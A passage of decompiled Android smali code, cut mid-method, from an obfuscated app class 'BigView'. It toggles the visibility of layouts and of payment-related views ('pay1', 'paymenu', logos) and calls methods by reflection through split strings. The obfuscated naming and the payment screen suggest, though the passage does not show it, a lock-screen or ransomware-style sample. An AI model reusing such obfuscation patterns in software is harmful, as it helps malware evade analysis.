    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert3:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v8, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_1

    .line 1383
    :goto_9
    const v41, 0x7f08007a

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/widget/LinearLayout;

    .line 1384
    .restart local v9    # "buttonhome4":Landroid/widget/LinearLayout;
    :try_start_9
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert3:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v9, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_9
    .catch Ljava/lang/Throwable; {:try_start_9 .. :try_end_9} :catch_0

    .line 1387
    :goto_a
    const v41, 0x7f080042

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v15

    check-cast v15, Landroid/widget/LinearLayout;

    .line 1389
    .local v15, "linLayout1":Landroid/widget/LinearLayout;
    new-instance v29, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v29

    invoke-direct {v0, v15}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1390
    .local v29, "wewe1":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v29

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1391
    const v41, 0x7f080045

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v16

    check-cast v16, Landroid/widget/LinearLayout;

    .line 1393
    .local v16, "linLayout2":Landroid/widget/LinearLayout;
    new-instance v33, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v33

    move-object/from16 v1, v16

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1394
    .local v33, "wewe2":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v33

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1395
    const v41, 0x7f080024

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v17

    check-cast v17, Landroid/widget/LinearLayout;

    .line 1397
    .local v17, "linLayout3":Landroid/widget/LinearLayout;
    new-instance v34, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v34

    move-object/from16 v1, v17

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1398
    .local v34, "wewe3":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v34

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1399
    const v41, 0x7f080026

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v18

    check-cast v18, Landroid/widget/LinearLayout;

    .line 1401
    .local v18, "linLayout4":Landroid/widget/LinearLayout;
    new-instance v35, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v35

    move-object/from16 v1, v18

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1402
    .local v35, "wewe4":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v35

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1403
    const v41, 0x7f080046

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v19

    check-cast v19, Landroid/widget/LinearLayout;

    .line 1405
    .local v19, "linLayout5":Landroid/widget/LinearLayout;
    new-instance v36, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v36

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1406
    .local v36, "wewe5":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v36

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1407
    const v41, 0x7f080047

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v20

    check-cast v20, Landroid/widget/LinearLayout;

    .line 1409
    .local v20, "linLayout6":Landroid/widget/LinearLayout;
    new-instance v37, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v37

    move-object/from16 v1, v20

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1410
    .local v37, "wewe6":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v37

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1411
    const v41, 0x7f080048

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v21

    check-cast v21, Landroid/widget/LinearLayout;

    .line 1413
    .local v21, "linLayout7":Landroid/widget/LinearLayout;
    new-instance v38, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v38

    move-object/from16 v1, v21

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1414
    .local v38, "wewe7":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v38

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1415
    const v41, 0x7f08004a

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v22

    check-cast v22, Landroid/widget/LinearLayout;

    .line 1417
    .local v22, "linLayout8":Landroid/widget/LinearLayout;
    new-instance v39, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v39

    move-object/from16 v1, v22

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1418
    .local v39, "wewe8":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v39

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1420
    const v41, 0x7f08004c

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v24

    check-cast v24, Landroid/widget/LinearLayout;

    .line 1422
    .local v24, "pay1":Landroid/widget/LinearLayout;
    new-instance v40, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v40

    move-object/from16 v1, v24

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1423
    .local v40, "wewe9":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    invoke-virtual/range {v40 .. v41}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1424
    const v41, 0x7f08005e

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v25

    check-cast v25, Landroid/widget/LinearLayout;

    .line 1426
    .local v25, "pay2":Landroid/widget/LinearLayout;
    new-instance v30, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v30

    move-object/from16 v1, v25

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1427
    .local v30, "wewe10":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v30

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1428
    const v41, 0x7f080061

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v26

    check-cast v26, Landroid/widget/LinearLayout;

    .line 1430
    .local v26, "paymenu":Landroid/widget/LinearLayout;
    new-instance v31, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v31

    move-object/from16 v1, v26

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1431
    .local v31, "wewe11":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x8

    move-object/from16 v0, v31

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1433
    const-string v41, "deerda3"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_a

    .line 1434
    const-string v41, "jjj"

    move-object/from16 v0, p0

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpay(Ljava/lang/String;)V

    .line 1437
    :cond_a
    invoke-static/range {p1 .. p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getId(Ljava/lang/String;)I

    move-result v41

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v14

    check-cast v14, Landroid/widget/LinearLayout;

    .line 1439
    .local v14, "linLayout":Landroid/widget/LinearLayout;
    new-instance v32, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v32

    invoke-direct {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1440
    .local v32, "wewe12":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v41, 0x0

    move-object/from16 v0, v32

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1441
    const v41, 0x7f080002

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Landroid/widget/ScrollView;

    .line 1442
    .local v11, "csrl":Landroid/widget/ScrollView;
    const/16 v41, 0x21

    move/from16 v0, v41

    invoke-virtual {v11, v0}, Landroid/widget/ScrollView;->fullScroll(I)Z

    goto/16 :goto_0

    .line 1384
    .end local v11    # "csrl":Landroid/widget/ScrollView;
    .end local v14    # "linLayout":Landroid/widget/LinearLayout;
    .end local v15    # "linLayout1":Landroid/widget/LinearLayout;
    .end local v16    # "linLayout2":Landroid/widget/LinearLayout;
    .end local v17    # "linLayout3":Landroid/widget/LinearLayout;
    .end local v18    # "linLayout4":Landroid/widget/LinearLayout;
    .end local v19    # "linLayout5":Landroid/widget/LinearLayout;
    .end local v20    # "linLayout6":Landroid/widget/LinearLayout;
    .end local v21    # "linLayout7":Landroid/widget/LinearLayout;
    .end local v22    # "linLayout8":Landroid/widget/LinearLayout;
    .end local v24    # "pay1":Landroid/widget/LinearLayout;
    .end local v25    # "pay2":Landroid/widget/LinearLayout;
    .end local v26    # "paymenu":Landroid/widget/LinearLayout;
    .end local v29    # "wewe1":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v30    # "wewe10":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v31    # "wewe11":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v32    # "wewe12":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v33    # "wewe2":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v34    # "wewe3":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v35    # "wewe4":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v36    # "wewe5":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v37    # "wewe6":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v38    # "wewe7":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v39    # "wewe8":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    .end local v40    # "wewe9":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    :catch_0
    move-exception v41

    goto/16 :goto_a

    .line 1381
    .end local v9    # "buttonhome4":Landroid/widget/LinearLayout;
    :catch_1
    move-exception v41

    goto/16 :goto_9

    .line 1378
    .end local v8    # "buttonhome3":Landroid/widget/LinearLayout;
    :catch_2
    move-exception v41

    goto/16 :goto_8

    .line 1375
    .end local v7    # "buttonhome2":Landroid/widget/LinearLayout;
    :catch_3
    move-exception v41

    goto/16 :goto_7

    .line 1372
    .end local v6    # "buttonhome1":Landroid/widget/LinearLayout;
    :catch_4
    move-exception v41

    goto/16 :goto_6

    .line 1367
    .end local v5    # "buttonhome":Landroid/widget/LinearLayout;
    .restart local v10    # "buttonhome5":Landroid/widget/LinearLayout;
    :catch_5
    move-exception v41

    goto/16 :goto_5

    .line 1361
    .end local v10    # "buttonhome5":Landroid/widget/LinearLayout;
    .restart local v9    # "buttonhome4":Landroid/widget/LinearLayout;
    :catch_6
    move-exception v41

    goto/16 :goto_4

    .line 1355
    .end local v9    # "buttonhome4":Landroid/widget/LinearLayout;
    .restart local v8    # "buttonhome3":Landroid/widget/LinearLayout;
    :catch_7
    move-exception v41

    goto/16 :goto_3

    .line 1348
    .end local v8    # "buttonhome3":Landroid/widget/LinearLayout;
    .restart local v7    # "buttonhome2":Landroid/widget/LinearLayout;
    :catch_8
    move-exception v41

    goto/16 :goto_2

    .line 1342
    .end local v7    # "buttonhome2":Landroid/widget/LinearLayout;
    .restart local v6    # "buttonhome1":Landroid/widget/LinearLayout;
    :catch_9
    move-exception v41

    goto/16 :goto_1
.end method

.method public showpay(Ljava/lang/String;)V
    .locals 43
    .param p1, "page"    # Ljava/lang/String;

    .prologue
    .line 1233
    const v42, 0x7f08004c

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/widget/LinearLayout;

    .line 1235
    .local v9, "pay1":Landroid/widget/LinearLayout;
    new-instance v22, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v22

    invoke-direct {v0, v9}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1236
    .local v22, "wewe":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v42, 0x8

    move-object/from16 v0, v22

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1238
    const v42, 0x7f08005e

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Landroid/widget/LinearLayout;

    .line 1240
    .local v11, "pay2":Landroid/widget/LinearLayout;
    new-instance v33, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v33

    invoke-direct {v0, v11}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1241
    .local v33, "wewe2":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v42, 0x8

    move-object/from16 v0, v33

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1242
    const v42, 0x7f080061

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v12

    check-cast v12, Landroid/widget/LinearLayout;

    .line 1244
    .local v12, "paymenu":Landroid/widget/LinearLayout;
    new-instance v35, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;

    move-object/from16 v0, v35

    invoke-direct {v0, v12}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;-><init>(Landroid/widget/LinearLayout;)V

    .line 1245
    .local v35, "wewe3":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;
    const/16 v42, 0x8

    move-object/from16 v0, v35

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat3;->gett(I)V

    .line 1246
    const v42, 0x7f08004e

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/ImageView;

    .line 1248
    .local v2, "logo1":Landroid/widget/ImageView;
    new-instance v36, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;

    move-object/from16 v0, v36

    invoke-direct {v0, v2}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;-><init>(Landroid/widget/ImageView;)V

    .line 1249
    .local v36, "wewe4":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;
    const/16 v42, 0x8

    move-object/from16 v0, v36

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;->gett(I)V

    .line 1250
    const v42, 0x7f08004f

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/ImageView;

    .line 1252
    .local v7, "logo2":Landroid/widget/ImageView;
    new-instance v37, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;

    move-object/from16 v0, v37

    invoke-direct {v0, v7}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;-><init>(Landroid/widget/ImageView;)V

    .line 1253
    .local v37, "wewe5":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;
    const/16 v42, 0x8

    move-object/from16 v0, v37

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;->gett(I)V

    .line 1254
    const v42, 0x7f080050

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/ImageView;

    .line 1256
    .local v8, "logo4":Landroid/widget/ImageView;
    new-instance v38, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;

    move-object/from16 v0, v38

    invoke-direct {v0, v8}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;-><init>(Landroid/widget/ImageView;)V

    .line 1257
    .local v38, "wewe6":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;
    const/16 v42, 0x8

    move-object/from16 v0, v38

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat4;->gett(I)V

    .line 1258
    const v42, 0x7f080054

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v13

    check-cast v13, Landroid/widget/TextView;

    .line 1260
    .local v13, "text1":Landroid/widget/TextView;
    new-instance v39, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v39

    invoke-direct {v0, v13}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1261
    .local v39, "wewe7":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    move-object/from16 v0, v39

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1262
    const v42, 0x7f080055

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v16

    check-cast v16, Landroid/widget/TextView;

    .line 1264
    .local v16, "text2":Landroid/widget/TextView;
    new-instance v40, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v40

    move-object/from16 v1, v16

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1265
    .local v40, "wewe8":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    move-object/from16 v0, v40

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1266
    const v42, 0x7f080056

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v19

    check-cast v19, Landroid/widget/TextView;

    .line 1268
    .local v19, "text4":Landroid/widget/TextView;
    new-instance v41, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v41

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1269
    .local v41, "wewe9":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    invoke-virtual/range {v41 .. v42}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1270
    const v42, 0x7f080058

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v14

    check-cast v14, Landroid/widget/TextView;

    .line 1272
    .local v14, "text1t2":Landroid/widget/TextView;
    new-instance v23, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v23

    invoke-direct {v0, v14}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1273
    .local v23, "wewe10":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    move-object/from16 v0, v23

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1274
    const v42, 0x7f080059

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v17

    check-cast v17, Landroid/widget/TextView;

    .line 1276
    .local v17, "text2t2":Landroid/widget/TextView;
    new-instance v24, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v24

    move-object/from16 v1, v17

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1277
    .local v24, "wewe11":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
    const/16 v42, 0x8

    move-object/from16 v0, v24

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;->gett(I)V

    .line 1278
    const v42, 0x7f08005a

    move-object/from16 v0, p0

    move/from16 v1, v42

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v20

    check-cast v20, Landroid/widget/TextView;

    .line 1280
    .local v20, "text4t2":Landroid/widget/TextView;
    new-instance v25, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;

    move-object/from16 v0, v25

    move-object/from16 v1, v20

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;-><init>(Landroid/widget/TextView;)V

    .line 1281
    .local v25, "wewe12":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat5;
